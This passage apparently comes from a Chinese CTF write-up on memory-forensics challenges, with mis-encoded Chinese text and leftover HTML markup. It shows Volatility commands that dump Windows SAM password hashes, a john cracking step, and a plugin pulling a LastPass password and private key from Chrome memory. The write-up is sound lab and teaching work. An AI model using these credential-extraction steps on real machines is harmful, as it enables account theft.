class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop0x000000003f30b480      <span class="token number">1</span>      <span class="token number">1</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop0x000000003f4ca830     <span class="token number">16</span>      <span class="token number">0</span> R--r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>important_work.exe0x000000003f8e2dd0      <span class="token number">1</span>      <span class="token number">1</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop</code></pre><p>ç„¶åæå–ä¸€ä¸‹çœ‹ä¸Šå»å…³é”®çš„ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 dumpfiles -Q 0x000000003f4ca830 --dump-dir<span class="token operator">=</span>./ -uVolatility Foundation Volatility Framework <span class="token number">2.6</span>ImageSectionObject 0x3f4ca830   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>important_work.exeDataSectionObject 0x3f4ca830   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>important_work.exe$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 dumpfiles -Q 0x000000003ec703d0 --dump-dir<span class="token operator">=</span>./ -uVolatility Foundation Volatility Framework <span class="token number">2.6</span>DataSectionObject 0x3ec703d0   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>work.zipSharedCacheMap 0x3ec703d0   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>work.zip</code></pre><p>å‹ç¼©åŒ…æ³¨é‡Šæç¤ºå¯†ç æ˜¯ <code>sha256(login_password)</code></p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222001125508.png"></p><p>äºæ˜¯å»å†…å­˜é‡Œæ‰¾å¯†ç ã€‚</p><p>å…ˆçœ‹çœ‹å†…å­˜ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 hivelistVolatility Foundation Volatility Framework <span class="token number">2.6</span>Virtual            Physical           Name------------------ ------------------ ----0xfffff8a001862010 0x000000003243d010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>System Volume Information<span class="token punctuation">\</span>Syscache.hve0xfffff8a00000f010 0x000000000f972010 <span class="token punctuation">[</span>no name<span class="token punctuation">]</span>0xfffff8a000024010 0x000000001b87d010 <span class="token punctuation">\</span>REGISTRY<span class="token punctuation">\</span>MACHINE<span class="token punctuation">\</span>SYSTEM0xfffff8a000053150 0x000000000fcad150 <span class="token punctuation">\</span>REGISTRY<span class="token punctuation">\</span>MACHINE<span class="token punctuation">\</span>HARDWARE0xfffff8a0003b0010 0x000000000c21a010 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>DEFAULT0xfffff8a000746010 0x0000000011518010 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>SOFTWARE0xfffff8a00074e410 0x0000000011b0d410 <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Boot<span class="token punctuation">\</span>BCD0xfffff8a000b1b010 0x000000003c38f010 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>SECURITY0xfffff8a000bc3410 0x000000003cd3c410 <span class="token punctuation">\</span>SystemRoot<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>Config<span class="token punctuation">\</span>SAM0xfffff8a000c06010 0x000000003bb46010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>LocalService<span class="token punctuation">\</span>NTUSER.DAT0xfffff8a000c8f410 0x000000003bc42410 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>ServiceProfiles<span class="token punctuation">\</span>NetworkService<span class="token punctuation">\</span>NTUSER.DAT0xfffff8a00131e010 0x00000000067e6010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>ntuser.dat0xfffff8a0013b0010 0x000000001b4bc010 <span class="token punctuation">\</span>??<span class="token punctuation">\</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>UsrClass.dat</code></pre><p>ç„¶åæå–å¯†ç ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># volatility -f name --profile=Win7SP1x64 hashdump -y æ³¨å†Œè¡¨ system çš„ virtual åœ°å€ -s SAM çš„ virtual åœ°å€</span>$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000bc3410Volatility Foundation Volatility Framework <span class="token number">2.6</span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Genga03:1001:aad3b435b51404eeaad3b435b51404ee:84b0d9c9f830238933e7131d60ac6436:::$ volatility -f important_work.raw --profile<span class="token operator">=</span>Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000bc3410 <span class="token operator">&gt;</span> pass.txt$ john pass.txt --format<span class="token operator">=</span>NT</code></pre><p>ç”¨ john ç ´è§£å¾—åˆ°å¯†ç ä¸º <code>asdqwe123</code></p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222000538165.png"></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> -n asdqwe123 <span class="token operator">&gt;</span> <span class="token builtin class-name">test</span>$ sha256sum <span class="token builtin class-name">test</span>          20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3  <span class="token builtin class-name">test</span></code></pre><p>è§£å‹å¾—åˆ°ä¸¤å¼ å›¾ç‰‡ï¼Œå™¢ <strong>ç›²æ°´å°</strong> å•Šã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/src.png" alt="src"></p><p><img src="/2021/03/04/CTF_2021HgameWeek4/Blind.png" alt="Blind"></p><p>ç”¨ GitHub ä¸Šçš„ <strong><a href="https://github.com/chishaxie/BlindWaterMark">BlindWaterMark</a></strong> æ¥æå–ç›²æ°´å°ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ python bwmforpy3.py decode src.png Blind.png output.png</code></pre><p>æå–å‡ºæ¥çš„æœ‰ç‚¹æœ¦èƒ§ï¼Œç¨å¾®è°ƒä¸€ä¸‹å¯¹æ¯”åº¦ã€‚</p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210222002346439.png" alt="flag"></p><p><code>hgame{7he_f1ame_brin9s_me_end1ess_9rief}</code></p><p>å¥½è€¶ï¼è¹­è¿™ä¸ªæœºä¼šç»ˆäºå­¦äº†å­¦ volatility çš„ä½¿ç”¨ï¼ˆï¼ˆ</p><h3 id="Akiraä¹‹ç³-2"><a href="#Akiraä¹‹ç³-2" class="headerlink" title="Akiraä¹‹ç³-2"></a>Akiraä¹‹ç³-2</h3><blockquote><p>â€¦â€¦<br>â€œæœ€åå‘¢ï¼Ÿâ€<br>â€œæœ€åå¥¹è¿˜æ˜¯æ²¡èƒ½å¹¸å…ï¼Œäººä»¬åœ¨ä¿é™©ç®±æ—å‘ç°äº†å¥¹çƒ§ç„¦çš„å°¸ä½“ï¼Œæ‰“å¼€ä¿é™©ç®±äººä»¬å‘ç°äº†ä¸€ä¸ªUç›˜ï¼Œæ˜¯å¥¹å°†å›å®¶ç”»å¥½çš„åŸç¨¿å¸¦æ¥æ—¶ç”¨çš„ â€¦â€¦â€</p><p><a href="https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z">https://1.oss.hgame2021.vidar.club/secret_work_bd40aea1c133a4d6422925deccb139e9.7z</a> </p></blockquote><p>ï¼ˆæ€ä¹ˆè¿™ä¸ªé•œåƒè¿˜è¦å¤§å•Šï¼Œ2GiBâ€¦</p><p>ç…§æ ·çœ‹é•œåƒä¿¡æ¯ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility -f secret_work.raw imageinfo   Volatility Foundation Volatility Framework <span class="token number">2.6</span>INFO    <span class="token builtin class-name">:</span> volatility.debug    <span class="token builtin class-name">:</span> Determining profile based on KDBG search<span class="token punctuation">..</span>.          Suggested Profile<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418                     AS Layer1 <span class="token builtin class-name">:</span> WindowsAMD64PagedMemory <span class="token punctuation">(</span>Kernel AS<span class="token punctuation">)</span>                     AS Layer2 <span class="token builtin class-name">:</span> FileAddressSpace <span class="token punctuation">(</span>/mnt/hgfs/ctf/Hgame2021/week4/Misc_Akira-2/secret_work.raw<span class="token punctuation">)</span>                      PAE <span class="token builtin class-name">type</span> <span class="token builtin class-name">:</span> No PAE                           DTB <span class="token builtin class-name">:</span> 0x187000L                          KDBG <span class="token builtin class-name">:</span> 0xf80003ff7120L          Number of Processors <span class="token builtin class-name">:</span> <span class="token number">16</span>     Image Type <span class="token punctuation">(</span>Service Pack<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> <span class="token number">1</span>                KPCR <span class="token keyword">for</span> CPU <span class="token number">0</span> <span class="token builtin class-name">:</span> 0xfffff80003ff9000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">1</span> <span class="token builtin class-name">:</span> 0xfffff88004500000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">2</span> <span class="token builtin class-name">:</span> 0xfffff8800457d000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">3</span> <span class="token builtin class-name">:</span> 0xfffff880009b9000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">4</span> <span class="token builtin class-name">:</span> 0xfffff88004654000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">5</span> <span class="token builtin class-name">:</span> 0xfffff880046d1000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">6</span> <span class="token builtin class-name">:</span> 0xfffff8800474e000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">7</span> <span class="token builtin class-name">:</span> 0xfffff880047cb000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">8</span> <span class="token builtin class-name">:</span> 0xfffff88004848000L                KPCR <span class="token keyword">for</span> CPU <span class="token number">9</span> <span class="token builtin class-name">:</span> 0xfffff880048c5000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">10</span> <span class="token builtin class-name">:</span> 0xfffff88004942000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">11</span> <span class="token builtin class-name">:</span> 0xfffff880049bf000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">12</span> <span class="token builtin class-name">:</span> 0xfffff88004a40000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">13</span> <span class="token builtin class-name">:</span> 0xfffff88004abd000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">14</span> <span class="token builtin class-name">:</span> 0xfffff88004b3a000L               KPCR <span class="token keyword">for</span> CPU <span class="token number">15</span> <span class="token builtin class-name">:</span> 0xfffff88004bb7000L             KUSER_SHARED_DATA <span class="token builtin class-name">:</span> 0xfffff78000000000L           Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-02-19 08:23:04 UTC+0000     Image <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2021</span>-02-19 <span class="token number">16</span>:23:04 +0800</code></pre><p>è¯»å–å¹¶æå–æ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility -f secret_work.raw --profile<span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span> <span class="token function">grep</span> DesktopVolatility Foundation Volatility Framework <span class="token number">2.6</span>0x000000003ef28430      <span class="token number">1</span>      <span class="token number">1</span> RW-rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HGAME2021-20210219-082257.raw0x000000003f260a80      <span class="token number">1</span>      <span class="token number">1</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop0x000000007ec7a070     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>desktop.ini0x000000007ec7d070     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>desktop.ini0x000000007ec9af20     <span class="token number">12</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>DumpIt.exe0x000000007ec9ba70     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Desktop.ini0x000000007ec9c370     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Maintenance<span class="token punctuation">\</span>Desktop.ini0x000000007ec9d070     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Accessibility<span class="token punctuation">\</span>Desktop.ini0x000000007ec9e8c0     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Desktop.ini0x000000007eca1820      <span class="token number">2</span>      <span class="token number">0</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>Google Chrome.lnk0x000000007eca1970     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Maintenance<span class="token punctuation">\</span>Desktop.ini0x000000007eca1c80     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>System Tools<span class="token punctuation">\</span>Desktop.ini0x000000007eca4f20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Games<span class="token punctuation">\</span>Desktop.ini0x000000007eca5970     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>System Tools<span class="token punctuation">\</span>Desktop.ini0x000000007eca6070     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Accessibility<span class="token punctuation">\</span>Desktop.ini0x000000007ecb7e20     <span class="token number">16</span>      <span class="token number">0</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Tablet PC<span class="token punctuation">\</span>Desktop.ini0x000000007ed64800      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop0x000000007ed70340      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop0x000000007ed715a0      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Public<span class="token punctuation">\</span>Desktop0x000000007ef94820      <span class="token number">2</span>      <span class="token number">0</span> RW-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>dumpme.txt0x000000007f416f20     <span class="token number">10</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>DumpIt.exe0x000000007f418a30      <span class="token number">2</span>      <span class="token number">1</span> R--rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop0x000000007f7d08f0      <span class="token number">2</span>      <span class="token number">0</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>ProgramData<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Accessories<span class="token punctuation">\</span>Remote Desktop Connection.lnk0x000000007fc28dd0      <span class="token number">1</span>      <span class="token number">1</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Genga03<span class="token punctuation">\</span>Desktop$ volatility -f secret_work.raw --profile<span class="token operator">=</span>Win7SP1x64 dumpfiles -Q 0x000000007ef94820 --dump-dir<span class="token operator">=</span>./ -u</code></pre><p><code>dumpme.txt</code></p><pre class="language-none"><code class="language-none">zip password is: 5trqES&amp;P43#y&amp;1TOAnd you may need LastPass</code></pre><p>è§£å‹ <code>secret.7z</code> å¾—åˆ° </p><p><img src="/2021/03/04/CTF_2021HgameWeek4/image-20210226021952159.png"></p><p><code>S-</code> å¼€å¤´çš„é‚£ç©æ„æ€ä¹ˆçœ‹éƒ½åƒæ˜¯å›æ”¶ç«™ï¼ˆ</p><p>ç”¨ LastPass å¾—åˆ°ç™»å½•å¯†ç ã€‚</p><p><a href="https://github.com/kevthehermit/volatility_plugins/tree/master/lastpass">https://github.com/kevthehermit/volatility_plugins/tree/master/lastpass</a></p><p>git clone ä¸‹æ¥ï¼Œç„¶åç”¨ <code>--plugins=</code> æŒ‡å®šè·¯å¾„ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ volatility --plugins<span class="token operator">=</span>/home/miaotony/CTF/Tools/volatility_plugins/lastpass -f secret_work.raw --profile<span class="token operator">=</span>Win7SP1x64 lastpassVolatility Foundation Volatility Framework <span class="token number">2.6</span>Searching <span class="token keyword">for</span> LastPass SignaturesFound pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">3948</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">3948</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">3948</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">3948</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">2916</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">2916</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">2916</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">2916</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">2916</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">1160</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">1160</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">1160</span><span class="token punctuation">)</span>Found pattern <span class="token keyword">in</span> Process: chrome.exe <span class="token punctuation">(</span><span class="token number">1160</span><span class="token punctuation">)</span>Found LastPass Entry <span class="token keyword">for</span> live.comUserName: windows login <span class="token operator">&amp;</span> miscrosoftPasword: UnknownFound LastPass Entry <span class="token keyword">for</span> live.com,bing.com,hotmail.com,live.com,microsoft.com,msn.com,windows.com,windowsazure.com,office.com,skype.com,azure.comUserName: windows login <span class="token operator">&amp;</span> miscrosoftPasword: vIg*q3x6GFa5aFBAFound Private KeyLastPassPrivateKey<span class="token operator">&lt;</span>308204BB020100300D06092A864886F70D0101010500048204A5308204A10201000282010100BF794F57D296731F67FD1007BEB13A7732DE75CEB688A0A0B8A4C9DE5D0757E83F9CE8EED14346977C72C65F2C2834F150D9FB54086531896CDEFD6D8F4A5CCA2D39E0ADCB24AA6EE075579E9C6631588E9474F6B91B9D1D4D23E55442FA4E89D6810A764CCCEB224DB045DE8E9B17D3A0E561F96D4F414E775A76EA74031AB0EDAB640D1D5FFB8B83F7F7F0CA2D415F9E68CB9DB1AB6028012724AE5674FCC5C0C6085FD2A5C39E785E36C899166120893095779104A123090681914834E063FD433E0F54A221BFA6B344F76B270D1FB5FBC5A7385911A0222A65FD7FDA3573F1A9C8C8B75003664DC998FB6BAB048D65F0A44A23E1446E299A4323280A13ED020111028201000B435F052A815210E7FFD3C43864C734302B341B37E9EB54BF91390D1487F61CB872A44A488B7C9F7FCA8423B74DA8C2E6A369230F8D7B626FD0E1BB268BE7572FD63A64937AA09D1C43234590BAB79BCC26D9B429019FD48C112B9B8B7822BCD061F18E7CFCFEC5C855A9C1CC273DA30976E7A542AA4F22BBBA06FEBB87B6468A44BD7E57DA570AB63E1A013AD75AC3B6B3927D274769E4774B7DC66DC10CA337465A39221C062B9B96BF4E8BF484C3F171A40E41B6D32FC417E0A54EFEE8896346947F7CB40B382F2D8AB78D6CD040570FAC76C0497CC3A677B884B6208157E482D42B0CD675C7F52F50AAA221C076F2604475B4A3F766B9B0103DA11633ED02818100FE8270E2DD0E11837ECDE3E61EED958F59F0FC906A46082A9C38ED503968174F233CC4A7E95F1DF125CEDAAF56A374B986883CFD803FCE883378DCBB43EBDBB631E6069D3151572368206134BB850E3B47638C8E5CB4F4A742D30D87876BB76ACEEA9A0EEB6BB5301A5E730C976F660693BA37E9A73F66140F3EE3E6058687B702818100C0985DC66AD22251EB0A59F5C2F2A4D1228B14BDABA74FD178EADD30D33B0E9FF1DD45ECA56A3CC7FD8CA7E1F7361B63FA1C7387B3A0CC6ECFF7B9DBC55B938E33AD5AFADB5C0BE11C8CAD924B682A9EA68DC53616C2D3FAD16417A5E045E732F60F17DDF1A67BEEEB46CA9A0FFDD6A0B9D1E08F7DBE7087C5AA4B25700A197B0281801DF13A750AF298A60EEB0BC0B8582FB6830D4AE3D044796E6CBB67369D578A458BACCBD784DE0385C8367414A0C7EF9D5B1F163BF0F872A69CA4CEAC9E9437F7512A1EE55118A0D6FD30FC608E881FCABD1AC53DECC9FEAA4418D46A4C2ACA48CD0C8A9857EE8DC96C8395108A49574C116133C122BC2A207A43A2574BF1B59D0281805AA20E03051797AE14411B4679DB98DAE31445FEE75DCB3566142BDABDC1704B44A45D24119B67E5A47E6D1F0AEC491FFD3A90B85487E7BBAD2948676BEEDC06AEE82AD0673A5FF176D8CA26BA12E6E13F51C637923D90EE80A792A8698A4EAE91E8FC2C357B859D9BE5140C43C2BF5AB1CC2D70B3A4E9A94DF5C9028F13CFC102818100AAFE94334DE0035FE8673623497290B5D059E6176FB785D83A2EA157C2E3B335E2E264DC5D7EBB73E0348E7578D956F1AF59E81D9FC24FFB23A61B262184A0B06B4A0F79A750E0EFE776646CFF6ACDB2A2A4CFFBDEC64DA06F05A76A8028CC3E0D487A21C4EADA734DADEDC8280528892E07FBC98DC47B0E2ED1E69EDA479D0<span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span>LastPassPrivateKey</code></pre><p>å¾—åˆ° <strong>ç³»ç»Ÿç™»å½•å¯†ç </strong> <code>vIg*q3x6GFa5aFBA</code>ã€‚</p><p>çœ‹åˆ°æœ‰ä¸ª Cookiesï¼Œå‘ç°æ˜¯ Sqlite æ•°æ®åº“ï¼Œæ˜¯ Chrome å­˜æ”¾ Cookie çš„ã€‚</p><p>åˆå‘ç°æ–‡ä»¶ç»“å°¾ æœ‰ä¸ª <code>localhostVeraCrypt/</code></p><p>æŸ¥äº†ä¸€ä¸‹ï¼ŒVeraCrypt æ˜¯ä¸€ç§ç¡¬ç›˜åŠ å¯†å·¥å…·ï¼Œç›²çŒœ container 